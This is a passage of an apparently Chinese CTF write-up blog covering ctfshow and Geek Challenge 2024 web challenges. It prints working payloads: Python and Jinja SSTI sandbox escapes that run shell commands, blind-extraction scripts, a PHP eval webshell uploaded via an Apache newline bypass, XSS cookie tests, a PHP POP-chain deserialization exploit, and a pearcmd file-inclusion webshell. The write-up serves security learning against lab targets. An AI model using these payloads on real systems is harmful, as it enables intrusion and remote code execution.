'os._wrap_close'>\",\"err\":false}\nq=str([].__class__.__base__.__subclasses__()[127].__init__.__globals__['popen'])#{\"res\":\"hack out!\",\"err\":false}\n```\n\n估计是不让用popen，用字符串拼接绕过一下\n\n```\nq=str(''.__class__.__base__.__subclasses__()[127].__init__.__globals__['po'+'pen']('ls ').read())#{\"res\":\"main.py\\nstart.sh\\n\",\"err\":false}\n```\n\n读一下main.py\n\n```\n{\n  \"res\": \"from typing import Optional\\nfrom fastapi import FastAPI,Form\\nimport uvicorn\\n\\napp = FastAPI()\\n\\n@app.get(\\\"/\\\")\\ndef hello():\\n    return {\\\"hello\\\": \\\"fastapi\\\"}\\n\\n@app.post(\\\"/cccalccc\\\",description=\\\"安全的计算器\\\")\\ndef calc(q: Optional[str] = Form(...)):\\n    try:\\n        hint = \\\"flag is in /mnt/f1a9,try to read it\\\"\\n        block_list = ['import','open','eval','exec']\\n        for keyword in block_list:\\n            if keyword in q:\\n                return {\\\"res\\\": \\\"hack out!\\\", \\\"err\\\": False}\\n        return {\\\"res\\\": eval(q), \\\"err\\\": False}\\n    except:\\n        return {\\\"res\\\": \\\"\\\", \\\"err\\\": True}\\n\\nif __name__ == '__main__':\\n    uvicorn.run(app=app, host=\\\"0.0.0.0\\\", port=8000, workers=1)\\n\",\n  \"err\": false\n}\n```\n\n有个提示\n\n```\nhint = \\\"flag is in /mnt/f1a9,try to read it\n```\n\n读flag就行\n\n```\nq=str(''.__class__.__base__.__subclasses__()[127].__init__.__globals__['po'+'pen']('cat /mnt/f1a9').read())\n```\n\n# 1024_hello_world\n\n## #SSTI\n\n![image-20250330154638614](../image/achieve/202411/1024杯/image-20250330154638614.png)\n\npost传一个key=1然后页面变成Hello,1!感觉也是ssti啊，测一下\n\n```\nkey={{8*8}}#Hello,8*8!\nkey={8*8}#Hello,{8*8}!\n```\n\n估计是过滤了`{{}}`,用`{%%}`print去进行绕过\n\n```\nkey={%print(1*2)%}#Hello,2!\n```\n\n可以确定存在ssti了\n\n但是尝试后发现过滤了很多东西，需要一些绕过姿势。\n过滤了的会报`500 Internal Server Error`。可以用if语句去测\n\n```\nkey={%if ''!=1%}air{%endif%} #500\nkey={%if \"\"!=1%}air{%endif%} #Hello,air!\nkey={%if \"\".__class__!=1%}air{%endif%}#500\nkey={%if \"\"[\"\\x5f\\x5fclass\\x5f\\x5f\"]!=1%}air{%endif%}#Hello,air!\n```\n\n下划线用unicode编码去绕过\n\n```\nkey={%print(\"\"[\"\\x5f\\x5fclass\\x5f\\x5f\"][\"\\x5f\\x5fbase\\x5f\\x5f\"][\"\\x5f\\x5fsubclasses\\x5f\\x5f\"]())%}\n```\n\n因为bp里比较难找,并没有直接的注入回显，所以我们需要利用自动化脚本去进行爆破。\n\n```python\nimport requests\n\nurl = \"http://44f6bdc3-3899-42b3-8cbf-91151294a663.challenge.ctf.show/\"\n\nfor i in range(1,200):\n    payload = '{%if [][\"\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f\"][\"\\\\x5f\\\\x5fbase\\\\x5f\\\\x5f\"][\"\\\\x5f\\\\x5fsubclasses\\\\x5f\\\\x5f\"]()['+str(i)+'][\"\\\\x5f\\\\x5finit\\\\x5f\\\\x5f\"][\"\\\\x5f\\\\x5fglobals\\\\x5f\\\\x5f\"][\"\\\\x5f\\\\x5fbuiltins\\\\x5f\\\\x5f\"][\"\\\\x5f\\\\x5fimport\\\\x5f\\\\x5f\"](\"os\")!=1%}air{%endif%}'\n    #payload = \"\".__class_.__base__.__subclasses__()[?].__init__.__globals__[\"__builtins__\"][\"__import__\"](\"os\")\n    data = {\n        \"key\" : payload\n    }\n    r = requests.post(url, data)\n    # print(data)\n    if \"air\" in r.text:\n        # print(r.text)\n        print(i)\n```\n\n运行后输出了64，直接用os模块去打就行\n\n```python\nimport requests\n\nurl = \"http://44f6bdc3-3899-42b3-8cbf-91151294a663.challenge.ctf.show/\"\n# cmd=\"ls /\"\ncmd=\"cat /*f*\"\n\ndic = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{-}'\nflag = \"\"\nfor i in range(0,50):\n    for s in dic:\n        payload = '{%if \"\"[\"\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f\"][\"\\\\x5f\\\\x5fbase\\\\x5f\\\\x5f\"][\"\\\\x5f\\\\x5fsubclasses\\\\x5f\\\\x5f\"]()[64][\"\\\\x5f\\\\x5finit\\\\x5f\\\\x5f\"][\"\\\\x5f\\\\x5fglobals\\\\x5f\\\\x5f\"][\"\\\\x5f\\\\x5fbuiltins\\\\x5f\\\\x5f\"][\"\\\\x5f\\\\x5fimport\\\\x5f\\\\x5f\"](\"os\")[\"\\\\x5f\\\\x5fdict\\\\x5f\\\\x5f\"][\"po\"+\"pen\"](\"'+ cmd +'\")[\"read\"]()['+ str(i) +']==\"'+ s +'\"%}air{%endif%}'\n        data = {\"key\": payload}\n        r = requests.post(url, data)\n        # print(data)\n        if \"air\" in r.text:\n            print(r.text)\n            flag += s\n            print(flag)\n    if '}' in flag:\n        break\n\nprint(flag)\n```\n\n# 1024_图片代理\n\n","tags":["1024杯"],"categories":["ctfshow"]},{"title":"ctfshow渔人杯(已做完)","url":"/2025/03/28/ctfshow渔人杯(已做完)/","content":"\n# 神仙姐姐\n\n![image-20250328160823357](../image/achieve/202411/渔人杯/image-20250328160823357.png)\n\n点了拜之后就显示拜了几次，提示磕首千遍，抓包看看\n\n![image-20250328161905974](../image/achieve/202411/渔人杯/image-20250328161905974.png)\n\n爆破发了999个包，但是好像还是没拿到flag，难道还有别的思路？\n\n后面看了wp才发现是在差不多四百多次的时候就有flag了，没办法，另外开靶机吧，这次直接用脚本跑，免得找了\n\n```python\nimport requests\n\nurl = \"http://aa7bd384-045a-4847-8494-a621ad75572b.challenge.ctf.show/sx.php\"\n\nCookies = {\"PHPSESSID\" : \"r4cvn9krjkdr67mm4ghb1uuhu4\"}\n\nwhile(True):\n    r = requests.get(url, cookies=Cookies)\n    if \"ctfshow{\" in r.text:\n        print(r.text)\n```\n\n![image-20250328163716758](../image/achieve/202411/渔人杯/image-20250328163716758.png)\n\n# 阿拉丁\n\n想要啥就有啥\n\n![image-20250328165252337](../image/achieve/202411/渔人杯/image-20250328165252337.png)\n\n也没搜到啥可用信息，发现数据包中post了一个json格式的数据\n\n随便问了一个flag是啥，就返回了flag第1位是c，搞得好像我自己猜不到一样emmm\n\n然后我发现这个挨个问就能问出flag的内容了\n\n![image-20250328170244673](../image/achieve/202411/渔人杯/image-20250328170244673.png)\n\n写个脚本试一下\n\n```python\nimport requests\n\nurl = \"http://1847caa3-ac50-414d-a969-acc10220c0aa.challenge.ctf.show/\"\n\ndata = {\n    \"wish\":\"flag第1位是什么?\"\n}\nr = requests.post(url, json=data)\nprint(r.text)\n#flag第1位是c\n```\n\n然后我们对r.text取索引-1拿到最后一位得到c\n\n那就写脚本吧\n\n```python\nimport requests\n\nurl = \"http://1847caa3-ac50-414d-a969-acc10220c0aa.challenge.ctf.show/\"\n\nflag = \"\"\nfor i in range(1,50):\n    data = {\n        \"wish\":f\"flag第{i}位是什么?\"\n    }\n    r = requests.post(url, json=data)\n    print(r.text)\n    flag += r.text[-1]\n    if r.text[-1] == \"}\":\n        break\nprint(flag)\n```\n\n# 迷\n\n一个登录口\n\n![image-20250328171336376](../image/achieve/202411/渔人杯/image-20250328171336376.png)\n\n目录有个/flag但是访问出来\n\n![image-20250328172309602](../image/achieve/202411/渔人杯/image-20250328172309602.png)\n\n根据题目里的\n\n![image-20250328172335357](../image/achieve/202411/渔人杯/image-20250328172335357.png)\n\n传个菜就行\n\n确实是渔人(愚人)杯哈哈哈哈哈\n\n# 飘啊飘\n\n有手X就行\n\n一开始以为是xss，后面才发现这个手x提示是手机的意思\n\n抓包修改User-Agent:Andorid \n\n![image-20250328173429295](../image/achieve/202411/渔人杯/image-20250328173429295.png)\n\n发现一个mb.html\n\n# Ez_Mysqli\n\n## #MySQL默认下不区分重音符号\n\n```php\n<?php\nhighlight_file(__FILE__);\n//flag在字段Y4tacker里\n$servername = \"127.0.0.1\";\n$username = \"root\";\n$password = \"root\";\n$dbname = \"ctfshow\";\n$conn = new mysqli($servername, $username, $password, $dbname);\nmysqli_set_charset($conn,'utf8');\nif ($conn->connect_error) {\n    die(\"连接失败: \" . $conn->connect_error);\n}\nif(stripos($_GET['username'],'Y4tacker')!==false){\n    die(\"爬\");\n}\nelse{\n    $username=$_GET['username'];\n}\nif (strlen($username)>=11){\n    die(\"爬\");\n}\nif (preg_match(\"/,|#|-|\\+|\\'|\\\"|or|union|select|show|\\\\\\\\/im\",$username)){\n    die(\"爬\");\n}\n$sql = \"select * from `yyds` where username='$username'\";\n$result = $conn->query($sql);\nif ($result->num_rows > 0) {\n    while($row = $result->fetch_assoc()) {\n       echo($row['password']);\n    }\n}\n$conn->close();\n?>\n\nNotice: Undefined index: username in /var/www/html/index.php on line 13\n\nNotice: Undefined index: username in /var/www/html/index.php on line 17\n```\n\n这里对username进行了检查,要求username里不能有Y4tacker，长度不能大于11，且对username进行正则表达式的检测\n\n这里的话其实想要进行sql注入的话因为长度限制所以大概率是实现不了的，只能尝试着绕过这个用户名Y4tacker\n\npayload\n\n```\n?username=Y4tàcker\n```\n\n根据MySQL默认情况不区分重音符号的特性\n\n- MySQL 的默认字符集通常是 `latin1`，而默认排序规则是 `latin1_swedish_ci`。\n\n- `latin1_swedish_ci`是一种不区分大小写、不区分重音符号的排序规则。\n\n  例如，`a`、`á`、`à`、`â` 被视为相同的字符。\n\n  在默认排序规则下，MySQL 会将带有重音符号的字符视为其基本字符。\n\n例如我们传入?username=ā，那么在解码的时候mysql会把ā当成是a去进行查询的\n\n![image-20250328233832896](../image/achieve/202411/渔人杯/image-20250328233832896.png)\n","tags":["渔人杯"],"categories":["ctfshow"]},{"title":"极客大挑战2024wp--web","url":"/2025/03/25/极客大挑战2024wp-web/","content":"\n# 0x01前言\n\n极客2024没来得及比赛就结束了，所以下面的都是后面复现去做的\n\n# 0x02赛题\n\n# baby_upload\n\nhint:Parar说他的黑名单无懈可击，GSBP师傅只花了十分钟就拿下了他的权限，你看看怎么绕过呢\n\n![image-20241125151101143](./../image/achieve/202411/极客大挑战2024/image-20241125151101143.png)\n\n先上传一个php文件看看\n\n![image-20250325093558530](../image/achieve/202411/极客大挑战2024/image-20250325093558530.png)\n\n有过滤，把文件内容删掉后测试发现存在后缀名验证，先看看能不能绕过这个，后面我随便上传一个图片都显示上传失败，有点神奇\n\n换个思路，先随便在url中传入一个路径\n\n![image-20250325094724950](../image/achieve/202411/极客大挑战2024/image-20250325094724950.png)\n\n版本apache2.4.10，CVE-2017-15715,然后当时就复现了一下写在另一篇文章了，这里直接给payload\n\n先上传我们的一句话木马然后抓包\n\n```\nPOST /index.php HTTP/2\nHost: 80-74c251eb-096f-471b-ac79-241c6f54f8bc.challenge.ctfplus.cn\nCookie: _ga=GA1.1.143187499.1742196271; _clck=1553zmg%7C2%7Cfui%7C0%7C1902; _ga_BFDVYZJ3DE=GS1.1.1742866027.5.1.1742866306.0.0.0\nContent-Length: 420\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nOrigin: https://80-74c251eb-096f-471b-ac79-241c6f54f8bc.challenge.ctfplus.cn\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryCrce63X7dVz32SvP\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://80-74c251eb-096f-471b-ac79-241c6f54f8bc.challenge.ctfplus.cn/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nPriority: u=0, i\n\n------WebKitFormBoundaryCrce63X7dVz32SvP\nContent-Disposition: form-data; name=\"upload_file\"; filename=\"1.php\"\nContent-Type: application/octet-stream\n\n<?php @eval($_POST['cmd']); ?>\n------WebKitFormBoundaryCrce63X7dVz32SvP\nContent-Disposition: form-data; name=\"name\"\n\n1.php\n------WebKitFormBoundaryCrce63X7dVz32SvP\nContent-Disposition: form-data; name=\"submit\"\n\n上传\n------WebKitFormBoundaryCrce63X7dVz32SvP--\n\n```\n\nname的值是我自己设置的1.php，然后在1.php后加上0a\n\n![image-20250325102404387](../image/achieve/202411/极客大挑战2024/image-20250325102404387.png)\n\n上传返回uploads/1.php路径，我们访问uploads/1.php%0a能访问出来，蚁剑连接拿flag\n\n# Problem_On_My_Web\n\nstarven师傅想要向他的女神表白，所以他专门写了个表白墙用来写他的甜言蜜语，你能看看他的表白墙有什么问题吗\n\n![image-20250325103258392](../image/achieve/202411/极客大挑战2024/image-20250325103258392.png)\n\n看到url里的参数去测试了一下发现漏洞点不在这\n\n然后在/manager路径下有一个提示\n\n```\nIf you could tell me where my website has a problem,i would give you a gift in my cookies!!! [Post url=]\n```\n\npost传参url=]提示Your host must be 127.0.0.1 and can be visit，但是修改请求头后没打通\n\n在/forms看到有留言板，打xss测试一下\n\n```\n<script>alert(1)</script>\n```\n\n一开始没看到有弹窗，然后把网页关掉重新开就有了，重新开靶机打xss\n\n根据刚刚的那个提示，尝试把cookie带出来\n\n```\n<script>alert(document.cookie)</script>\n```\n\n然后在/manager路径post\n\n```\nurl=127.0.0.1\n```\n\n传这个之后应该就会有管理员去触发我们的xss\n\n![image-20250325110835015](../image/achieve/202411/极客大挑战2024/image-20250325110835015.png)\n\n# rce_me\n\nJust rce me\n\n```php\n<?php\nheader(\"Content-type:text/html;charset=utf-8\");\nhighlight_file(__FILE__);\nerror_reporting(0);\n\n# Can you RCE me?\n\n\nif (!is_array($_POST[\"start\"])) {\n    if (!preg_match(\"/start.*now/is\", $_POST[\"start\"])) {\n        if (strpos($_POST[\"start\"], \"start now\") === false) {\n            die(\"Well, you haven't started.<br>\");\n        }\n    }\n}\n\necho \"Welcome to GeekChallenge2024!<br>\";\n\nif (\n    sha1((string) $_POST[\"__2024.geekchallenge.ctf\"]) == md5(\"Geekchallenge2024_bmKtL\") &&\n    (string) $_POST[\"__2024.geekchallenge.ctf\"] != \"Geekchallenge2024_bmKtL\" &&\n    is_numeric(intval($_POST[\"__2024.geekchallenge.ctf\"]))\n) {\n    echo \"You took the first step!<br>\";\n\n    foreach ($_GET as $key => $value) {\n        $$key = $value;\n    }\n\n    if (intval($year) < 2024 && intval($year + 1) > 2025) {\n        echo \"Well, I know the year is 2024<br>\";\n\n        if (preg_match(\"/.+?rce/ism\", $purpose)) {\n            die(\"nonono\");\n        }\n\n        if (stripos($purpose, \"rce\") === false) {\n            die(\"nonononono\");\n        }\n        echo \"Get the flag now!<br>\";\n        eval($GLOBALS['code']);\n        \n        \n\n        \n    } else {\n        echo \"It is not enough to stop you!<br>\";\n    }\n} else {\n    echo \"It is so easy, do you know sha1 and md5?<br>\";\n}\n?>\nWell, you haven't started.\n```\n\n按照代码先post传一个start=start now进行下面的代码\n\n```php\nif (\n    sha1((string) $_POST[\"__2024.geekchallenge.ctf\"]) == md5(\"Geekchallenge2024_bmKtL\") &&\n    (string) $_POST[\"__2024.geekchallenge.ctf\"] != \"Geekchallenge2024_bmKtL\" &&\n    is_numeric(intval($_POST[\"__2024.geekchallenge.ctf\"]))\n)\n```\n\n将Geekchallenge2024_bmKtL进行md5加密后发现值为0e开头的0e073277003087724660601042042394，这里就是强碰撞了，但是要求我们传入纯数字的__2024.geekchallenge.ctf，那我们就直接找sha1加密后是0e开头的看看里面有没有纯数字的值\n\n## sha1强碰撞\n\n```php\n<?php\n$a = 10932435112;\n$b = \"Geekchallenge2024_bmKtL\";\nif (sha1($a) == md5($b)){\n    echo \"right\";\n}\n//right\n```\n\n参考：https://blog.csdn.net/cosmoslin/article/details/120973888\n\npayload\n\n```\nstart=start now&__2024.geekchallenge.ctf=10932435112\n```\n\n## 非法变量解析\n\n一开始没成功，后面仔细看发现是非法变量的问题，用[去绕过就行\n\n```\nstart=start now&_[2024.geekchallenge.ctf=10932435112\n```\n\n![image-20250325112941629](../image/achieve/202411/极客大挑战2024/image-20250325112941629.png)\n\n继续下一层\n\n```php\nforeach ($_GET as $key => $value) {\n        $$key = $value;\n    }\n\n    if (intval($year) < 2024 && intval($year + 1) > 2025) {\n        echo \"Well, I know the year is 2024<br>\";\n\n        if (preg_match(\"/.+?rce/ism\", $purpose)) {\n            die(\"nonono\");\n        }\n\n        if (stripos($purpose, \"rce\") === false) {\n            die(\"nonononono\");\n        }\n        echo \"Get the flag now!<br>\";\n        eval($GLOBALS['code']);\n```\n\n$$下的动态变量，进行**变量覆盖**\n\n可以创建后续要用的 $year $purpose $code\n\n##  intval() 的截断特性\n\n- `intval()` 函数会将字符串转换为整数，但会截断非数字部分。，例如我们传入2023e1经过处理后就是2023\n\n所以我们传入year=2023e1\n\n```\n在intval处理后就是2023，是满足<2024的，但是后面的intval($year+1)>2025是为什么可以满足呢？\n在 $year + 1 中，如果 $year 是字符串，PHP 会尝试将其转换为数字。\n\"2023e1\" + 1 返回 20231（因为 \"2023e1\" 被解析为科学计数法，即 2023 * 10^1 = 20230，加 1 后为 20231）。\n```\n\n![image-20250325113914557](../image/achieve/202411/极客大挑战2024/image-20250325113914557.png)\n\n然后$purpose的话需要绕过stripos\n\n## 绕过stripos\n\n用数组可以绕过这个判断，stripos在处理数组的时候会返回null，是等于false的\n\n![image-20250325114440904](../image/achieve/202411/极客大挑战2024/image-20250325114440904.png)\n\n最后code就传命令进行rce就行\n\n![image-20250325114545681](../image/achieve/202411/极客大挑战2024/image-20250325114545681.png)\n\n# ezpop\n\n## #死亡exit绕过\n\n```php\n<?php\nClass SYC{\n    public $starven;\n    public function __call($name, $arguments){\n        if(preg_match('/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i',$this->starven)){\n            die('no hack');\n        }\n        file_put_contents($this->starven,\"<?php exit();\".$this->starven);\n    }\n}\n\nClass lover{\n    public $J1rry;\n    public $meimeng;\n    public function __destruct(){\n        if(isset($this->J1rry)&&file_get_contents($this->J1rry)=='Welcome GeekChallenge 2024'){\n            echo \"success\";\n            $this->meimeng->source;\n        }\n    }\n\n    public function __invoke()\n    {\n        echo $this->meimeng;\n    }\n\n}\n\nClass Geek{\n    public $GSBP;\n    public function __get($name){\n        $Challenge = $this->GSBP;\n        return $Challenge();\n    }\n\n    public function __toString(){\n        $this->GSBP->Getflag();\n        return \"Just do it\";\n    }\n\n}\n\nif($_GET['data']){\n    if(preg_match(\"/meimeng/i\",$_GET['data'])){\n        die(\"no hack\");\n    }\n   unserialize($_GET['data']);\n}else{\n   highlight_file(__FILE__);\n}\n```\n\n第一眼猜是php反序列化，继续往下看\n\n其实这道题的pop链很简单啊，每个触发点都是很明白的，直接写pop链就行\n\n```\nlover::__destruct->Geek::__get->lover::->__invoke->Geek::__toString->SYC::__call\n```\n\n然后我们需要关注一个点就是关于死亡exit的绕过\n\n[php死亡exit()绕过](https://xiaolong22333.top/archives/114/)\n\n第二种情况\n\n```\nfile_put_contents($content,\"<?php exit();\".$content);\n```\n\n可以用rot13编码绕过\n\n```\ncontent=php://filter/string.rot13|<?cuc cucvasb();?>|/resource=shell.php\n通过管道符进行逐步执行，将中间的进行rot13编码后写入shell.php中\n```\n\nexp\n\n```php\n<?php\nClass SYC{\n    public $starven;\n}\n\nClass lover{\n    public $J1rry=\"data://text/plain,Welcome GeekChallenge 2024\";\n    public $meimeng;\n\n\n}\n\nClass Geek{\n    public $GSBP;\n\n}\n$a = new lover();\n$a->meimeng=new Geek();\n$a->meimeng->GSBP = new lover();\n$a->meimeng->GSBP->meimeng = new Geek();\n$a->meimeng->GSBP->meimeng->GSBP = new SYC();\n$a->meimeng->GSBP->meimeng->GSBP->starven = 'php://filter/string.rot13|<?cuc cucvasb();?>|/resource=shell.php';\n$b = serialize($a);\n//$c=str_replace(\"s:7:\\\"meimeng\\\";\",\"S:7:\\\"\\\\6deimeng\\\";\",$b);//绕过wakeup以及\necho urlencode($c);\n```\n\n序列化后的字符\n\n```\nO:5:\"lover\":2:{s:5:\"J1rry\";s:44:\"data://text/plain,Welcome GeekChallenge 2024\";s:7:\"\\6deimeng\";O:4:\"Geek\":1:{s:4:\"GSBP\";O:5:\"lover\":2:{s:5:\"J1rry\";s:44:\"data://text/plain,Welcome GeekChallenge 2024\";s:7:\"\\6deimeng\";O:4:\"Geek\":1:{s:4:\"GSBP\";O:3:\"SYC\":1:{s:7:\"starven\";s:64:\"php://filter/string.rot13|<?cuc cucvasb();?>|/resource=shell.php\";}}}}}\n```\n\n额没注意看这里过滤了rot，那就试着.htaccess预处理包含文件，自定义包含flag文件\n\n```\nphp://filter/write=string.strip_tags/?>php_value\nauto_prepend_file /flag\".\"\\n\".\"#/resource=.htaccess\n```\n\n解释一下payload\n\n- `write=string.strip_tags` 是 `php://filter` 的一个过滤器，表示在写入数据时，使用 `strip_tags` 函数去除 HTML 和 PHP 标签。\n- `?>`：关闭 PHP 标签，表示后续内容是纯文本。\n- `php_value auto_prepend_file /flag`：这是一个 Apache 配置指令，表示在执行 PHP 脚本之前，自动包含 `/flag` 文件。\n- `\"\\n\"`：换行符，用于分隔指令。\n- `#`：注释符号，表示后续内容被忽略。\n- `/resource=.htaccess` 指定了目标文件为 `.htaccess`。\n\n那最终的exp就是\n\n```php\n<?php\nClass SYC{\n    public $starven;\n}\n\nClass lover{\n    public $J1rry=\"data://text/plain,Welcome GeekChallenge 2024\";\n    public $meimeng;\n\n\n}\n\nClass Geek{\n    public $GSBP;\n\n}\n$a = new lover();\n$a->meimeng=new Geek();\n$a->meimeng->GSBP = new lover();\n$a->meimeng->GSBP->meimeng = new Geek();\n$a->meimeng->GSBP->meimeng->GSBP = new SYC();\n$a->meimeng->GSBP->meimeng->GSBP->starven = \"php://filter/write=string.strip_tags/?>php_value_auto_prepend_file /flag\".\"\\n\".\"#/resource=/htaccess\";\n$b = serialize($a);\n$c=str_replace(\"s:7:\\\"meimeng\\\";\",\"S:7:\\\"\\\\6deimeng\\\";\",$b);\necho urlencode($c);\n```\n\npayload\n\n```\n?data=O%3A5%3A%22lover%22%3A2%3A%7Bs%3A5%3A%22J1rry%22%3Bs%3A44%3A%22data%3A%2F%2Ftext%2Fplain%2CWelcome+GeekChallenge+2024%22%3BS%3A7%3A%22%5C6deimeng%22%3BO%3A4%3A%22Geek%22%3A1%3A%7Bs%3A4%3A%22GSBP%22%3BO%3A5%3A%22lover%22%3A2%3A%7Bs%3A5%3A%22J1rry%22%3Bs%3A44%3A%22data%3A%2F%2Ftext%2Fplain%2CWelcome+GeekChallenge+2024%22%3BS%3A7%3A%22%5C6deimeng%22%3BO%3A4%3A%22Geek%22%3A1%3A%7Bs%3A4%3A%22GSBP%22%3BO%3A3%3A%22SYC%22%3A1%3A%7Bs%3A7%3A%22starven%22%3Bs%3A93%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.strip_tags%2F%3F%3Ephp_value+auto_prepend_file+%2Fflag%0A%23%2Fresource%3D.htaccess%22%3B%7D%7D%7D%7D%7D\n```\n\n![image-20250325155043866](../image/achieve/202411/极客大挑战2024/image-20250325155043866.png)\n\n**为什么这里是大写 `S`？**\n\n- 在 PHP 的序列化字符串中，如果字符串包含 **非 ASCII 字符** 或 **转义字符**，PHP 会使用 `S` 标记来表示这是一个 **二进制安全的字符串**。\n\n在 `S:7:\"\\6deimeng\";` 中，大写 `S` 的出现是因为字符串中包含了转义字符 `\\6`。PHP 的序列化机制会自动将包含转义字符或非 ASCII 字符的字符串标记为二进制安全字符串，因此使用 `S` 而不是 `s`。\n\n# ez_include\n\n## #require_once 绕过不能重复包含文件的限制\n\n```php\n\n<?php\nhighlight_file(__FILE__);\nrequire_once 'starven_secret.php';\nif(isset($_GET['file'])) {\n    if(preg_match('/starven_secret.php/i', $_GET['file'])) {\n        require_once $_GET['file'];\n    }else{\n        echo \"还想非预期?\";\n    }\n}\n```\n\n有限制的文件包含，之前有学习过\n\n看看php的版本，是PHP/7.3.22，那就不能用00截断去包含，试试路径长度截断文件包含\n\n操作系统存在着最大路径长度的限制。可以输入超过最大路劲长度的目录，这样系统就会将后面的路劲丢弃，导致拓展名截断。\n\n- Windows下最大路径长度为256B\n- Linux下最大路径长度为4096B\n\n大部分靶机都是Linux环境啊那我们就试一下\n\n```\n?file=php://filter/convert.base64-\nencode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro\nc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/sel\nf/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/roo\nt/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro\nc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php\n```\n\n通过 `preg_match` 检查用户输入，确保只有包含 `starven_secret.php` 的路径才能被加载。，但由于 `require_once` 的特性，即使匹配成功，也不会重复加载目标文件。所以我们想要读取到starven_secret.php，就需要通过构造超长路径，使得路径被截断，最终访问到 `starven_secret.php`。\n\n![image-20250325161751528](../image/achieve/202411/极客大挑战2024/image-20250325161751528.png)\n\n出来了，拿去解密一下\n\n```\n<?php\n$secret = \"congratulation! you can goto /levelllll2.php to capture the flag!\";\n?>\n```\n\n## #pear文件包含\n\n访问/levelllll2.php得到\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nif (isset($_GET [\"syc\"])){\n    $file = $_GET [\"syc\"];\n    $hint = \"register_argc_argv = On\";\n    if (preg_match(\"/config|create|filter|download|phar|log|sess|-c|-d|%|data/i\", $file)) {\n        die(\"hint都给的这么明显了还不会做?\");\n    }\n    if(substr($_SERVER['REQUEST_URI'], -4) === '.php'){\n        include $file;\n    }\n}\n```\n\n分析\n\n```\nregister_argc_argv = On\n```\n\n意味着 PHP 会启用对命令行参数的处理，并将这些参数传递给脚本的 `$argc` 和 `$argv` 变量。\n\n- `$argc` 变量会存储命令行参数的数量（包括脚本名称）。\n- `$argv` 变量会存储一个数组，包含所有命令行参数。\n\n考虑pear文件包含，利用pearcmd.php进行包含\n\n因为这里create禁用了，所以可以通过远程包含的方式去包含一句话木马文件\n\npayload\n\n```\n?syc=/usr/local/lib/php/pearcmd.php&+config-create+/<?=@eval($_POST['cmd']);?>+/var/www/html/shell.php\n```\n\n打了半天没打通，最后发现是hackbar传参会把<和>进行编码导致我们的木马失效，那就用bp发包吧\n\n```\nGET /levelllll2.php?syc=/usr/local/lib/php/pearcmd.php&+config-create+/<?=@eval($_POST['cmd']);?>+/var/www/html/shell.php HTTP/1.1\nHost: 80-2686a728-2d3c-41a7-93c4-237b011ac5b1.challenge.ctfplus.cn\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: _ga=GA1.1.143187499.1742196271; _clck=1553zmg%7C2%7Cfui%7C0%7C1902; _ga_BFDVYZJ3DE=GS1.1.1742889070.9.1.1742889075.0.0.0; _clsk=9d8936%7C1742894848566%7C1%7C1%7Cw.clarity.ms%2Fcollect\nConnection: keep-alive\n\n\n```\n\n然后hackbar\n\n![image-20250325175347931](../image/achieve/202411/极客大挑战2024/image-20250325175347931.png)\n\n成功RCE，发现disable_function里没有禁用函数，那就找flag\n\n```\ncmd=print_r($_SERVER);\n```\n\nflag找了半天目录没找到，估计是在环境变量里\n\n![image-20250325181210240](../image/achieve/202411/极客大挑战2024/image-20250325181210240.png)\n\n# ez_http\n\n前面跟着做就行\n\n第一层\n\n```\nLevel1: please use get parameter welcome\nnonono,I need welcome == geekchallenge2024\n```\n\nGET传参\n\n```\n?welcome=geekchallenge2024\n```\n\n第二层\n\n```\nLevel2：please user two post params username & password\nnonono, username=Starven , password=qwert123456\n```\n\nPOST传参\n\n```\nusername=Starven&password=qwert123456\n```\n\n第三层\n\n```\nLevel3：you must from https://www.sycsec.com\n```\n\n设置Referer请求头\n\n```\nReferer: https://www.sycsec.com\n```\n\n第四层\n\n```\nLevel4：you must from local ip\n```\n\n设置X-Forwarded-For\n\n```\nX-Forwarded-For: 127.0.0.1\n```\n\n标识客户端的原始 IP 地址，但是发现没成功\n\n换成X-Real-IP\n\n```\nX-Real-IP: 127.0.0.1\n```\n\n标识客户端的真实 IP 地址。\n\n第五层\n\n```php\nLevel5：you must let Starven give you flag\n<?php\nif ($_SERVER[\"HTTP_STARVEN\"] == \"I_Want_Flag\") {\n    echo \"........\";\n}\nnonono,you can't get my flag\n```\n\n意思很明显了，设置个STARVEN请求头\n\n```\nSTARVEN: I_Want_Flag\n```\n\n![image-20250325194244675](../image/achieve/202411/极客大挑战2024/image-20250325194244675.png)\n\n有一段token，那就解密一下\n\n![image-20250325194447928](../image/achieve/202411/极客大挑战2024/image-20250325194447928.png)\n\nJWT的，估计是需要将hasFlag改为true\n\n源码里发现了key\n\n```\n<!--key is \"Starven_secret_key\"-->\n```\n\n## 